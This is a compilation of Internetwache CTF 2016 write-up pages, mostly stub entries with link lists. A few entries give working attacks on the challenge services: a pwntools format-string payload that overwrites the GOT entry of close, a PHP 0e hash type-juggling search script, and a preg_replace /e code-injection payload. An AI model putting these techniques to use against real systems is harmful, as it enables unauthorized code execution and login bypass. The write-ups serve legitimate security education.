We knew that it must be something like `IW{..}`.
So we looked in the ASCII Table and saw that this must be some OCT representation.


So the flag was `IW{DR0N3S_W1TH_PH0N3S}`.


## Other write-ups and resources

* <https://www.xil.se/post/internetwache-2016-crypto-80-arturo182/>
* <https://0x90r00t.com/2016/02/22/internetwache-ctf-2016-crypto-80-procrastination-write-up/>
* <http://losfuzzys.github.io/writeup/2016/02/22/iwctf2016-procrastination/>
* <https://github.com/WesternCyber/CTF-WriteUp/blob/master/2016/Internetwache/Crypto/Crypto80.md>
* <http://sexyplatypussies.com/writeups/InternetwacheCTF2016/crypto80.txt>
* <https://blog.amishsecurity.com/-crypto80-procrastination/>
* <https://www.youtube.com/watch?v=mzueu4qoPms># Internetwache CTF 2016 : EquationSolver

**Category:** Exploit
**Points:** 60
**Solves:** 222
**Description:**

> Description: I created a program for an unsolveable equation system. My friend somehow forced it to solve the equations. Can you tell me how he did it?
> 
> 
> Service: 188.166.133.53:12049


## Write-up

(TODO)

## Other write-ups and resources

* <http://www.codehead.co.uk/internetwache-ctf-2016-equationsolver-exploit-60-points/>
* <https://github.com/0xbkth/ctf/blob/master/IW/exp60_IW/writeup.md>
* <https://www.xil.se/post/internetwache-2016-exp60-kbeckmann/>
* <https://github.com/Kileak/CTF/blob/master/2016/internetwache/exp/equationsolver/README.md>
* <https://0x90r00t.com/2016/02/22/internetwache-ctf-2016-exploit-60-equationsolver-write-up/>
* <https://github.com/WesternCyber/CTF-WriteUp/blob/master/2016/Internetwache/Exploit/Exp60.md>
* <https://blog.amishsecurity.com/internetwache-ctf-2016/>
* <http://poning.me/2016/03/04/equationsolver/>
* <https://www.whitehatters.academy/internetwache-ctf/>
* [Spanish](http://www.amn3s1a.com/blog/writeup/2016/02/22/equationsolver-iw-writeup.html)
# Internetwache CTF 2016 : FlagStore

**Category:** Exploit
**Points:** 70
**Solves:** 211
**Description:**

> Description: Here's the ultimate flag store. Store and retrieve your flags whenever you want.
> 
> 
> Attachment: [exp70.zip](./exp70.zip)
> 
> 
> Service: 188.166.133.53:12157


## Write-up

(TODO)

## Other write-ups and resources

* <https://forum.xeksec.com/f138/t88654/>
* <https://github.com/0xbkth/ctf/blob/master/IW/exp70_IW/task/writeup.md>
* <http://www.codehead.co.uk/internetwache-ctf-2016-flagstore-exploit-70-points/>
* <https://www.xil.se/post/internetwache-2016-exp70-kbeckmann/>
* <https://github.com/Kileak/CTF/tree/master/2016/internetwache/exp/flagstore>
* <https://0x90r00t.com/2016/02/22/internetwache-ctf-2016-exploit-70-flagstore-write-up/>
* <https://www.whitehatters.academy/internetwache-ctf/>
# Internetwache CTF 2016 : Remote Printer

**Category:** Exploit
**Points:** 80
**Solves:** 101
**Description:**

> Description: Printer are very very important for offices. Especially for remote printing. My boss told me to build a tool for that task.
>
>
> Attachment: [exp80.zip](./exp80.zip)
>
>
> Service: 188.166.133.53:12377


## Write-up

So this remote printer takes an address and a port and connects to the remote
service. It then reads some data and outputs it. Well let's just point it to
itself:

```
$ nc 188.166.133.53 12377
This is a remote printer!
Enter IPv4 address:127.0.0.1
Enter port:12377
Thank you, I'm trying to print 127.0.0.1:12377 now!
This is a remote printer!
```

The last line is the input from itself. So we probably need a listener
reachable via the internet.

The binary itself is rather small, it just consists of the `main` function and
`0x08048786`. The main function uses scanf to read the ip address and port and
calls the second function which connects to the given ip address and port.
Then receives up to `0x2000` bytes of data and then prints it. Let's take a
look at the later one:

```
0x08048815      6a00           push 0
0x08048817      6800200000     push 0x2000
0x0804881c      8d85e4dfffff   lea eax, [ebp-local_2055]
0x08048822      50             push eax
0x08048823      ff75f4         push dword [ebp - 0xc]
0x08048826      e885fdffff     call sym.imp.recv         ; recv 0x2000 to stack

[...]

0x08048844      83ec0c         sub esp, 0xc
0x08048847      8d85e4dfffff   lea eax, [ebp-local_2055]
0x0804884d      50             push eax
0x0804884e      e88dfcffff     call sym.imp.printf      ; input
0x08048853      83c410         add esp, 0x10
0x08048856      83ec0c         sub esp, 0xc
0x08048859      ff75f4         push dword [ebp - 0xc]
0x0804885c      e85ffdffff     call sym.imp.close
0x08048861      83c410         add esp, 0x10
0x08048864      90             nop
```

We can see that the buffer, which is located on the stack, is printed using
`printf`... oh. Classic format string vulnerability. Should be easy.

```
$ python2 -c 'print "ABCD" + ".%p"*100' | nc -vv -l -p 4444
$ nc 188.166.133.53 12377
This is a remote printer!
Enter IPv4 address:X.X.X.X
Enter port:4444
Thank you, I'm trying to print X.X.X.X:4444 now!
ABCD.0xffffbcec.0x2000.(nil).(nil).(nil).(nil).0x44434241.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0xa.(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil)
```

So it's definitely a format string vulnerability and we can see that at offset
7 is the start of our format string. So that's where we can put the addresses
we want to write to.

We can see that immediately after the call to `printf` there is a call to
`close`. So we do the usual: Overwrite `GOT` entry of `close` with something of
our liking to take over control flow. Because the organizers were nice they
left us some dead code lying around that will print us the flag at
`0x08048867`. So we'll just redirect control flow there.

```python
from pwn import *  # NOQA

velf = ELF("./RemotePrinter")
gotclose = velf.got["close"]

# uses two 2-byte writes to keep printed garbage at minimum
fmtstr = p32(gotclose)
fmtstr += p32(gotclose + 2)
target = 0x08048867
x = 0x0804 - 8
y = 0x8867 - 8 - x
fmtstr += "%{}c%8$hn%{}c%7$hn".format(x, y)

log.info("trying to write to got entry @ {}".format(hex(gotclose)))
log.info("overwriting with function {}".format(hex(target)))

log.info("using format string: \n" + hexdump(fmtstr))

with open("./payload", "wb") as f:
    f.write(fmtstr)
    f.write("\n")

# use with
# cat payload | nc -v -l -p 4444
```

And we have the flag:

```
YAY, FLAG: IW{YVO_F0RmaTt3d_RMT_Pr1nT3R}
```

## Other write-ups and resources

* <https://github.com/0xbkth/ctf/blob/master/IW/exp80_IW/writeup.md>
* <https://www.xil.se/post/internetwache-2016-exp80-kbeckmann/>
* <https://github.com/Kileak/CTF/tree/master/2016/internetwache/exp/remoteprinter>
* <https://losfuzzys.github.io/writeup/2016/02/21/iwctf2016-remote-printer/>
* <https://0x90r00t.com/2016/02/22/internetwache-ctf-2016-exploit-80-remote-printer-write-up/>
* <https://www.whitehatters.academy/iw2016-ctf-exp80/>
* <https://github.com/ByteBandits/writeups/tree/master/internetwache-ctf-2016/exploit/remote-printer/sudhackar>
* <https://bannsecurity.com/index.php/home/10-ctf-writeups/31-internetwache-ctf-2016-remote-printer>
* <http://www.amn3s1a.com/blog/writeup/2016/02/23/exp80-iw-writeup.html>
* [Spanish](https://blog.ka0labs.net/post/31/)
* <https://github.com/tothi/ctfs/tree/master/internetwache-ctf-2016/exploit/remote-printer-80>
* <https://github.com/VulnHub/ctf-writeups/blob/master/2016/internetwache/exp80.md>
* <https://pwningmad.wordpress.com/2016/02/21/internetwasche-ctf-2016-exploit-80-remote-printer/>
# Internetwache CTF 2016 : Ruby's count

**Category:** Exploit
**Points:** 50
**Solves:** 191
**Description:**

> Description: Hi, my name is Ruby. I like converting characters into ascii values and then calculating the sum.
> 
> 
> Service: 188.166.133.53:12037


## Write-up

(TODO)

## Other write-ups and resources

* <https://0x90r00t.com/2016/02/22/internetwache-ctf-2016-exploit-50-ruby-s-count-write-up/>
* <https://forum.xeksec.com/f138/t88652/>
* <http://www.codehead.co.uk/internetwache-ctf-2016-rubys-count-exploit-50-points/>
* <https://www.xil.se/post/internetwache-2016-exp50-kbeckmann/>
* <http://hacktizen.blogspot.de/2016/02/internetwache-2016-exp50-writeup.html>
* <http://rektsec.github.io/writeups/ctf/internetwatche-2016-ctf-rubys-count-exp-50/>
* <https://github.com/WesternCyber/CTF-WriteUp/blob/master/2016/Internetwache/Exploit/Exp50.md>
* <http://poning.me/2016/03/04/rubys-count/>
* <https://www.whitehatters.academy/internetwache-ctf/>
# Internetwache CTF 2016 : Sh-ock

**Category:** Exploit
**Points:** 90
**Solves:** 73
**Description:**

> Description: This is some kind of weird thing. I am sh-ocked.
>
>
> Service: 188.166.133.53:12589


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/0xbkth/ctf/blob/master/IW/exp90_IW/writeup.md>
* <https://www.xil.se/post/internetwache-2016-exp-90-arturo182/>
* <https://github.com/Kileak/CTF/tree/master/2016/internetwache/exp/shock>
* <http://softweaver.org/writeups/2016/02/21/Internetwache_exp90.html>
* <https://www.whitehatters.academy/iw2016-ctf-exp90-sh-ock/>
* <https://github.com/Ninjex/Wargame-Writeups/tree/master/CaptureTheFlag/2016/InternetWache-CTF/exp90>
# Internetwache CTF 2016 : 404 Flag not found

**Category:** Misc
**Points:** 80
**Solves:** 250
**Description:**

> Description: I tried to download the flag, but somehow received only 404 errors :( Hint: The last step is to look for flag pattern.
> 
> 
> Attachment: [misc80.zip](./misc80.zip)


## Write-up

(TODO)

## Other write-ups and resources

* <https://0x90r00t.com/2016/02/22/internetwache-ctf-2016-misc-80-404-flag-not-found-write-up/>
* <https://github.com/Kileak/CTF/tree/master/2016/internetwache/misc/flagnotfound>
* <https://github.com/jmazzola/CTFs/tree/master/Internetwache%20CTF%202016/Misc/Misc80%20-%20404%20Flag%20not%20found>
* <http://cafelinux.info/articles/writeups-internetwache-ctf-2016-404-flag-not-found-misc80>
* <https://github.com/WesternCyber/CTF-WriteUp/blob/master/2016/Internetwache/Misc/Misc80.md>
* <https://github.com/tuvshuud/1up/blob/master/internetwache/misc80.md>
* <https://github.com/p4-team/ctf/tree/master/2016-02-20-internetwache/misc_80>
* <https://github.com/raccoons-team/ctf/tree/master/2016-02-20-internetwache-ctf/misc80>
# Internetwache CTF 2016 : BarParty

**Category:** Misc
**Points:** 90
**Solves:** 193
**Description:**

> Description: Can you read the barcodes?
> 
> 
> Attachment: [misc90.zip](./misc90.zip)


## Write-up

(TODO)

## Other write-ups and resources

* <https://0x90r00t.com/2016/02/22/internetwache-ctf-2016-misc-90-barparty-write-up/>
* <https://github.com/WesternCyber/CTF-WriteUp/blob/master/2016/Internetwache/Misc/Misc90.md>
* <http://www.mousab.com/2016/02/internetwache-ctf-2016-misc90-write-up.html>
* <https://github.com/QuokkaLight/write-ups/blob/master/internetwache-ctf-2016/misc/misc90.md>
* <http://poning.me/2016/02/23/barparty/>
# Internetwache CTF 2016 : Quick Run

**Category:** Misc
**Points:** 60
**Solves:** 234
**Description:**

> Description: Someone sent me a file with white and black rectangles. I don't know how to read it. Can you help me?
> 
> 
> Attachment: [misc60.zip](./misc60.zip)


## Write-up

(TODO)

## Other write-ups and resources

* <https://www.xil.se/post/internetwache-2016-misc-60-arturo182/>
* <http://corb3nik.github.io/2016/02/20/Quick-Run/>
* <https://github.com/jmazzola/CTFs/tree/master/Internetwache%20CTF%202016/Misc/Misc60%20-%20Quick%20Run>
* <https://github.com/bl4de/ctf/blob/master/2016/internetwache_2016/QuickRun_Misc60_writeup.md>
* <http://rektsec.github.io/writeups/ctf/internetwatche-2016-ctf-quick-run-misc-60/>
* <http://ctfwriteups.blogspot.de/2016/02/internetwache-ctf-2016-quick-run.html>
* <https://github.com/WesternCyber/CTF-WriteUp/blob/master/2016/Internetwache/Misc/Misc60.md>
* <http://poning.me/2016/02/25/quick-run/>
# Internetwache CTF 2016 : Rock with the wired shark!

**Category:** Misc
**Points:** 70
**Solves:** 416
**Description:**

> Description: Sniffing traffic is fun. I saw a wired shark. Isn't that strange?
> 
> 
> Attachment: [misc70.zip](./misc70.zip)


## Write-up

(TODO)

## Other write-ups and resources

* <https://0x90r00t.com/2016/02/22/internetwache-ctf-2016-misc-70-rock-with-the-wired-shark-write-up/>
* <https://www.xil.se/post/internetwache-2016-misc-70-arturo182/>
* <http://corb3nik.github.io/2016/02/20/Rock-with-the-wired-shark/>
* <https://github.com/jmazzola/CTFs/tree/master/Internetwache%20CTF%202016/Misc/Misc70%20-%20Rock%20with%20the%20wired%20shark!>
* <https://github.com/bl4de/ctf/blob/master/2016/internetwache_2016/RockWithTheShark_Misc70_writeup.md>
* <https://deya2diab.wordpress.com/2016/02/20/internetwache-ctf/>
* <https://github.com/WesternCyber/CTF-WriteUp/blob/master/2016/Internetwache/Misc/Misc70.md>
* <https://github.com/tuvshuud/1up/blob/master/internetwache/misc60.md>
* <https://github.com/p4-team/ctf/tree/master/2016-02-20-internetwache/misc_70>
* <https://www.youtube.com/watch?v=zZEpql4LErY>
* <https://github.com/raccoons-team/ctf/tree/master/2016-02-20-internetwache-ctf/misc70>
# Internetwache CTF 2016 : The hidden message

**Category:** Misc
**Points:** 50
**Solves:** 306
**Description:**

> Description: My friend really can't remember passwords. So he uses some kind of obfuscation. Can you restore the plaintext?
> 
> 
> Attachment: [misc50.zip](./misc50.zip)


## Write-up

(TODO)

## Other write-ups and resources

* <https://forum.xeksec.com/f138/t88653/>
* <https://www.xil.se/post/internetwache-2016-misc-50-arturo182/>
* <http://corb3nik.github.io/2016/02/20/The-Hidden-Message/>
* <https://github.com/jmazzola/CTFs/tree/master/Internetwache%20CTF%202016/Misc/Misc50%20-%20The%20Hidden%20Message>
* <http://cafelinux.info/articles/writeups-internetwache-ctf-2016-the-hidden-message-misc50>
* <http://rektsec.github.io/writeups/ctf/internetwatche-2016-ctf-the-hidden-message-misc-50/>
* <http://ctfwriteups.blogspot.de/2016/02/internetwache-ctf-2016-hidden-message.html>
* <https://0x90r00t.com/2016/02/22/internetwache-ctf-2016-misc-50-the-hidden-message-write-up/>
* <https://github.com/WesternCyber/CTF-WriteUp/blob/master/2016/Internetwache/Misc/Misc50.md>
* <http://poning.me/2016/02/23/the-hidden-message/>
* <https://github.com/p4-team/ctf/tree/master/2016-02-20-internetwache/misc_50>
* <http://err0r-451.ru/internetwache-web-0ldsk00lblog-80pts/>
# Internetwache CTF 2016 write-ups

* <https://ctf.internetwache.org/>
* [Scoreboard](https://ctf.internetwache.org/scoreboard) or [scores.json](scores.json) or [scores.csv](scores.csv)
* [CTF Repo by the organizers including sources and flags to challenges](https://github.com/internetwache/Internetwache-CTF-2016)

## Completed write-ups

* [code/a-numbers-game-2-70](code/a-numbers-game-2-70)
* [code/a-numbers-game-50](code/a-numbers-game-50)
* [code/brute-with-force-80](code/brute-with-force-80)
* [code/its-prime-time-60](code/its-prime-time-60)
* [crypto/crypto-pirat-50](crypto/crypto-pirat-50)
* [crypto/hashdesigner-70](crypto/hashdesigner-70)
* [crypto/procrastination-80](crypto/procrastination-80)
* [exploit/remote-printer-80](exploit/remote-printer-80)
* [reversing/eso-tape-80](reversing/eso-tape-80)
* [web/mess-of-hash-50](web/mess-of-hash-50)
* [web/replace-with-grace-60](web/replace-with-grace-60)

## External write-ups only

* [code/dark-forest-90](code/dark-forest-90)
* [crypto/bank-90](crypto/bank-90)
* [crypto/oh-bob-60](crypto/oh-bob-60)
* [exploit/equationsolver-60](exploit/equationsolver-60)
* [exploit/flagstore-70](exploit/flagstore-70)
* [exploit/rubys-count-50](exploit/rubys-count-50)
* [exploit/sh-ock-90](exploit/sh-ock-90)
* [misc/404-flag-not-found-80](misc/404-flag-not-found-80)
* [misc/barparty-90](misc/barparty-90)
* [misc/quick-run-60](misc/quick-run-60)
* [misc/rock-with-the-wired-shark-70](misc/rock-with-the-wired-shark-70)
* [misc/the-hidden-message-50](misc/the-hidden-message-50)
* [reversing/file-checker-60](reversing/file-checker-60)
* [reversing/serverfarm-70](reversing/serverfarm-70)
* [reversing/spim-50](reversing/spim-50)
* [reversing/the-cube-90](reversing/the-cube-90)
* [web/0ldsk00lblog-80](web/0ldsk00lblog-80)
* [web/texmaker-90](web/texmaker-90)
* [web/the-secret-store-70](web/the-secret-store-70)

## Missing write-ups# Internetwache CTF 2016 : Eso Tape

**Category:** Reversing
**Points:** 80
**Solves:** 69
**Description:**

> Description: I once took a nap on my keyboard. I dreamed of a brand new language, but I could not decipher it nor get its meaning. Can you help me? Hint: Replace the spaces with either '{' or '}' in the solution. Hint: Interpreters don't help. Operations write to the current index.
> 
> 
> Attachment: [rev80.zip](./rev80.zip)


## Write-up

We are given just one file in the challenge ZIP: `priner.tb`

Opening the file, we are presented with a wonderous mix of #, %, +, -, &, * and & symbols. Given this, plus the name of the challenge and the name/extension of the file, I assumed this is some sort of esoteric language, so I found my way to [esolangs.org's language list](http://esolangs.org/wiki/Language_list) and started investigating.

Considering the challenge name Eso **Tape**, I guessed the t in .tb might also stand for tape. I searched for "tape" on the language list page, and found what I was looking for in the third match: [TapeBagel](http://esolangs.org/wiki/TapeBagel).

The TapeBagel wiki entry details the action each block of characters performs on the program state, however I was unable to find an interpreter I could run on the challenge file. I was (un)lucky enough to be working on this challenge before the hints for it were released, which stated "Interpreters don't help. Operations write to the current index.", which implies that the activity the program performs might be simple enough to work out by hand.......

Instead, I implemented an *extremely* simple (don't judge, it's for a CTF!) TapeBagel interpreter in Python, which I've made available [here](https://github.com/jashanbhoora/TapeBagel-Interpreter)

So! Running the file we are given through my interpreter outputs the string "IW ILOVETAPEBAGEL ".

Replacing the spaces with braces, we get our flag!
I really enjoyed this challenge! Kudos to the creator!

Flag: **IW{ILOVETAPEBAGEL}**

## Other write-ups and resources

* <https://www.xil.se/post/internetwache-2016-rev80-kbeckmann/>
* <https://www.xil.se/post/internetwache-2016-rev-80-arturo182/>
* <https://github.com/jashanbhoora/write-ups-2016/tree/master/internetwache-ctf-2016/reversing/eso-tape-80>
* <https://0x90r00t.com/2016/02/22/internetwache-ctf-2016-reverse-80-eso-tape-write-up/>
* <https://github.com/p4-team/ctf/tree/master/2016-02-20-internetwache/re_80>
* <https://github.com/EspacioTeam/write-ups/tree/master/2016/internetwache/exp80>
* <https://github.com/QuokkaLight/write-ups/blob/master/internetwache-ctf-2016/reverse/rev80.md>
* <http://poning.me/2016/02/29/eso-tape/>
[esolangs.org's language list](http://esolangs.org/wiki/Language_list)
[TapeBagel](http://esolangs.org/wiki/TapeBagel)
[TapeBagel Interpreter](https://github.com/jashanbhoora/TapeBagel-Interpreter)
# Internetwache CTF 2016 : File Checker

**Category:** Reversing
**Points:** 60
**Solves:** 190
**Description:**

> Description: My friend sent me this file. He told that if I manage to reverse it, I'll have access to all his devices. My misfortune that I don't know anything about reversing :/
> 
> 
> Attachment: [rev60.zip](./rev60.zip)


## Write-up

(TODO)

## Other write-ups and resources

* <http://www.codehead.co.uk/internetwache-ctf-2016-file-checker-reversing-60-points/>
* <https://www.xil.se/post/internetwache-2016-rev60-kbeckmann/>
* <https://github.com/Kileak/CTF/tree/master/2016/internetwache/rev/filechecker>
* <https://0x90r00t.com/2016/02/22/internetwache-ctf-2016-reverse-60-file-checker-write-up/>
* <https://www.praetorian.com/blog/internetwache-re60-writeup-symbolic-execution-tramples-ctf-challenge/>
* <https://github.com/jmazzola/CTFs/tree/master/Internetwache%20CTF%202016/Reversing/Rev60%20-%20File%20Checker>
* <http://tylerhalfpop.com/2016/02/21/blog-Internetwache-CTF-re60.html>
* <https://www.youtube.com/watch?v=DKYRt34sagg>
* <https://github.com/raccoons-team/ctf/tree/master/2016-02-20-internetwache-ctf/re60>
* <http://poning.me/2016/02/26/file-checker/>
* <https://www.youtube.com/watch?v=mzueu4qoPms>
# Internetwache CTF 2016 : ServerfARM

**Category:** Reversing
**Points:** 70
**Solves:** 156
**Description:**

> Description: Someone handed me this and told me that to pass the exam, I have to extract a secret string. I know cheating is bad, but once does not count. So are you willing to help me?
> 
> 
> Attachment: [rev70.zip](./rev70.zip)


## Write-up

(TODO)

## Other write-ups and resources

* <https://www.xil.se/post/internetwache-2016-rev70-kbeckmann/>
* <https://0x90r00t.com/2016/02/22/internetwache-ctf-2016-reverse-70-serverfarm-write-up/>
* <https://github.com/jmazzola/CTFs/tree/master/Internetwache%20CTF%202016/Reversing/Rev70%20-%20ServerfARM>
* <https://eugenekolo.com/blog/internetwache-2016-ctf-writeups/>
* <http://tylerhalfpop.com/2016/02/21/blog-Internetwache-CTF-re70.html>
* <https://github.com/p4-team/ctf/tree/master/2016-02-20-internetwache/re_70>
* <https://github.com/VulnHub/ctf-writeups/blob/master/2016/internetwache/rev70.md>
# Internetwache CTF 2016 : SPIM

**Category:** Reversing
**Points:** 50
**Solves:** 208
**Description:**

> Description: My friend keeps telling me, that real hackers speak assembly fluently. Are you a real hacker? Decode this string: "IVyN5U3X)ZUMYCs"
> 
> 
> Attachment: [rev50.zip](./rev50.zip)


## Write-up

(TODO)

## Other write-ups and resources

* <https://www.xil.se/post/internetwache-2016-rev-50-arturo182/>
* <https://github.com/Kileak/CTF/tree/master/2016/internetwache/rev/spim>
* <https://0x90r00t.com/2016/02/22/internetwache-ctf-2016-reverse-50-spim-write-up/>
* <https://github.com/jmazzola/CTFs/tree/master/Internetwache%20CTF%202016/Reversing/Rev50%20-%20SPIM>
* <https://www.whitehatters.academy/iw2016-ctf-rev50-spim/>
* <https://github.com/ShadyHats/Writeups/tree/master/2016-02-20_Internetwache/rev50>
* <http://poning.me/2016/02/25/spim/>
# Internetwache CTF 2016 : The Cube

**Category:** Reversing
**Points:** 90
**Solves:** 197
**Description:**

> Description: I really like Rubik's Cubes, so I created a challenge for you. I put the flag on the white tiles and scrambled the cube. Once you solved the cube, you'll know my secret.
> 
> 
> Attachment: [rev90.zip](./rev90.zip)


## Write-up

(TODO)

## Other write-ups and resources

* <https://www.xil.se/post/internetwache-2016-rev90-rspkt/>
* <http://poning.me/2016/02/22/the-cube/>
* <https://0x90r00t.com/2016/02/22/internetwache-ctf-2016-reverse-90-the-cube-write-up/>
* <https://github.com/WesternCyber/CTF-WriteUp/blob/master/2016/Internetwache/Reverse/Rev90.md>
# Internetwache CTF 2016 : 0ldsk00lBlog

**Category:** Web
**Points:** 80
**Solves:** 231
**Description:**

> Description: I stumbled across this kinda oldskool blog. I bet it is unhackable, I mean, there's only static HTML.
> 
> 
> Service: <https://0ldsk00lblog.ctf.internetwache.org/>


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/raccoons-team/ctf/tree/master/2016-02-20-internetwache-ctf/web80>
* <https://github.com/bl4de/ctf/blob/master/2016/internetwache_2016/0ldsk00lBlog_Web80_writeup.md>
* <http://cafelinux.info/articles/writeups-internetwache-ctf-2016-0ldsk00lblog-web80>
* <https://github.com/Execut3/CTF/tree/master/Participated-CTF/2016/InternetWache/web/web-80>
* <https://github.com/Veneno0/CTFwp/tree/master/Internetwache-CTF-2016/Web80>
* <https://deya2diab.wordpress.com/2016/02/20/internetwache-ctf/>
* <http://ctfwriteups.blogspot.de/2016/02/internetwache-ctf-2016-0ldsk00lblog.html>
* <https://github.com/Ninjex/Wargame-Writeups/tree/master/CaptureTheFlag/2016/InternetWache-CTF/web80>
* <http://err0r-451.ru/internetwache-web-0ldsk00lblog-80pts/>
* <https://github.com/VulnHub/ctf-writeups/blob/master/2016/internetwache/web80.md>
# Internetwache CTF 2016 : Mess of Hash

**Category:** Web
**Points:** 50
**Solves:** 143
**Description:**

> Description: Students have developed a new admin login technique. I doubt that it's secure, but the hash isn't crackable. I don't know where the problem is...
> 
> 
> Attachment: [web50.zip](./web50.zip)
> 
> 
> Service: <https://mess-of-hash.ctf.internetwache.org/>

Sources: <https://github.com/internetwache/Internetwache-CTF-2016/tree/master/tasks/web50/code>

## Write-up

Writeup by [unicornsasfuel](https://github.com/unicornsasfuel)

PHP is weird. No doubt about it. There are a lot of quirks.

One of PHP's quirks is that strings will be interpreted as numbers in scientific notation if they are in the right format, specifically <number>e<number>. If such a number starts with `0e`, it is effectively `0`. If two strings match these parameters and are compared through the double-equals operator (which, importantly, allows for type conversion from string to number), they will always match as they are both effectively `0`.

It is possible for a hashing algorithm to produce such a hash, though the chances are roughly one in 200 million. Through CTF challenge magic, the admin hash `0e408306536730731920197920342119` matches these conditions.

~~~PHP
<?php

$admin_user = "pr0_adm1n";
$admin_pw = clean_hash("0e408306536730731920197920342119");

function clean_hash($hash) {
    return preg_replace("/[^0-9a-f]/","",$hash);
}

function myhash($str) {
    return clean_hash(md5(md5($str) . "SALT"));
}
~~~

There are published values whose md5 sums match these conditions, but as we can see above, the hashing algorithm is custom, so we must perform our own search. Below is a Python solver script which provides us the password we need:

~~~Python
import md5
import string
import sys

def do_0e_check(inhash):
   if inhash[:2] == '0e':
      print 'hash %s begins with 0e' % inhash
      if all([char in string.digits for char in inhash[2:]]):
         return True
   return False

i = int(sys.argv[1])
answer = 0

print "Starting cracking process..."

while True:
   hashcandidate = md5.new(md5.new(str(i)).hexdigest()+'SALT').hexdigest()
   if do_0e_check(hashcandidate):
      break
   else:
      i += 1
      if i % 100000 == 0:
         sys.stdout.write("\rCurrent i value: %s" % i)
         sys.stdout.flush()

print "Answer found: md5(md5(%s)+'SALT') matches" % (i)
~~~

Logging in with username `pr0_adm1n` and the found password results in a successful login and the disclosure of the flag.

## Other write-ups and resources

* <https://forum.xeksec.com/f138/t88657/>
* <https://www.xil.se/post/internetwache-2016-web-50-simonvik/>
* <https://eugenekolo.com/blog/internetwache-2016-ctf-writeups/>
* <https://blog.amishsecurity.com/internetwache-ctf-2016-web50-mess-of-hash/>
* <https://github.com/p4-team/ctf/tree/master/2016-02-20-internetwache/web_50>
* <http://pastebin.com/K4xGYGMK>
# Internetwache CTF 2016 : Replace with Grace

**Category:** Web
**Points:** 60
**Solves:** 229
**Description:**

> Description: Regular expressions are pretty useful. Especially when you need to search and replace complex terms.
> 
> 
> Service: <https://replace-with-grace.ctf.internetwache.org/>

Sources: <https://github.com/internetwache/Internetwache-CTF-2016/tree/master/tasks/web60/code>

## Write-up

**by [LosFuzzys](https://hack.more.systems)**

The given website is used to "Search & Replace" with regular expressions.
From other challenges we know, that we can execute php code using:

```php
/(.*)/e
```

(Check out [this Stackoverflow answer](http://stackoverflow.com/a/16986549/1518225) for details.)

The problem was, that the website filtered some inputs like:

* file
* open


It worked with:

```php
var_dump(show_source('flag.php'));
```

A simple, but nice challenge.

```
IW{R3Pl4c3_N0t_S4F3}
```

## Other write-ups and resources

* <https://github.com/raccoons-team/ctf/tree/master/2016-02-20-internetwache-ctf/web60>
* <https://forum.xeksec.com/f138/t88658/>
* <http://losfuzzys.github.io/writeup/2016/02/22/iwctf2016-ReplaceWithGrace/>
* <http://cafelinux.info/articles/writeups-internetwache-ctf-2016-replace-with-grace-web60>
* <http://rektsec.github.io/writeups/ctf/internetwatche-2016-ctf-replace-with-grace-web-60/>
* <http://ctfwriteups.blogspot.de/2016/02/internetwache-ctf-2016-replace-with.html>
* <https://github.com/WesternCyber/CTF-WriteUp/blob/master/2016/Internetwache/Web/Web60.md>
# Internetwache CTF 2016 : TexMaker

**Category:** Web
**Points:** 90
**Solves:** 163
**Description:**

> Description: Creating and using coperate templates is sometimes really hard. Luckily, we have a webinterace for creating PDF files. Some people doubt it's secure, but I reviewed the whole code and did not find any flaws.
> 
> 
> Service: <https://texmaker.ctf.internetwache.org>

Sources: <https://github.com/internetwache/Internetwache-CTF-2016/tree/master/tasks/web90/code>

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/raccoons-team/ctf/tree/master/2016-02-20-internetwache-ctf/web90>
* <https://forum.xeksec.com/f138/t88651/>
* <http://cafelinux.info/articles/writeups-internetwache-ctf-2016-texmaker-web90>
* <https://github.com/Execut3/CTF/tree/master/Participated-CTF/2016/InternetWache/web/web90>
* <http://ctfwriteups.blogspot.de/2016/02/internetwache-ctf-2016-texmaker.html>
* <https://github.com/p4-team/ctf/tree/master/2016-02-20-internetwache/web_90>
* <http://err0r-451.ru/internetwache-web-texmaker-90pts/>
* <https://github.com/VulnHub/ctf-writeups/tree/master/2016/internetwache>
# Internetwache CTF 2016 : The Secret Store

**Category:** Web
**Points:** 70
**Solves:** 243
**Description:**

> Description: We all love secrets. Without them, our lives would be dull. A student wrote a secure secret store, however he was babbling about problems with the database. Maybe I shouldn't use the 'admin' account. Hint1: Account deletion is intentional. Hint2: I can't handle long usernames.
> 
> 
> Service: <https://the-secret-store.ctf.internetwache.org/>

Sources: <https://github.com/internetwache/Internetwache-CTF-2016/tree/master/tasks/web70/code>

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/raccoons-team/ctf/tree/master/2016-02-20-internetwache-ctf/web70>
* <https://github.com/p4-team/ctf/tree/master/2016-02-20-internetwache/web_70>
* <http://rektsec.github.io/writeups/ctf/internetwatche-2016-ctf-the-secret-store-web-70/>
* <https://github.com/WesternCyber/CTF-WriteUp/blob/master/2016/Internetwache/Web/Web70.md>
* <http://err0r-451.ru/internetwache-web-the-secret-store-70pts/>
# Nuit du Hack CTF Quals : matriochka-step1-50

**Category:** Crack-Me
**Points:** 50
**Solves:** 432
**Description:**
Description

Can you help me?

Recently, I found an executable binary.

As I'm a true newbie,

Certainly, to solve it, I will have difficulties.

Keep in mind, the first step is quite easy.

